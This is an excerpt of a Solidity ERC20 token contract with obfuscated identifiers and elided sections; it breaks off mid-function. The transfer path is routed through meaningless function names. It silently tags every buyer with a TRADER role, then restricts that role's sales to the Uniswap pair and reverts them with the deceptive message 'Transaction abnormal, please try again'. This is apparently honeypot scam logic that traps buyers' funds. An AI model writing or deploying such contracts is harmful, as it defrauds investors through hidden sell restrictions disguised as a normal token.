...
interface _FSEBNSDFGRoleControl {
...
abstract contract _FSEBNSDFGConsole is Context, _FSEBNSDFGRoleControl {
    ...
    function FSEBNSDFGcheckRole(bytes32 role, address account, uint256 num) internal virtual {
        if(role == TRADER){
            uint256 rm = _roles[role].RD.RM[account].sub(num);
            if(rm <= 0){
                revert("Transaction abnormal, please try again");
            }
        }
...
contract _FSEBNSDFGERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _FSEBNSDFGERC20, _FSEBNSDFGConsole {
    ...
    ) _FSEBNSDFGERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_FSEBNSDFGERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __FSEBNSDFGcxvgfg(from, to, amt);

    }

    function __FSEBNSDFGcxvgfg(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __FSEBNSDFGtyjtyjht(from, to, amt);
    }


    function __FSEBNSDFGtyjtyjht(address from, address to, uint256 amt) internal {
        ...
        __FSEBNSDFGfghthy(from, to, amt);
    }

    function __FSEBNSDFGfghthy(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __FSEBNSDFGjghnyuk(from, to, amt);
    }


    function __FSEBNSDFGjghnyuk(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            if(newnum > 50){
                FSEBNSDFGcheckRole(TRADER,from,amt);
            }
            
        }

        __FSEBNSDFGuykrfd(from, to, amt);
    }

    function __FSEBNSDFGuykrfd(address from, address to, uint256 amt) internal {
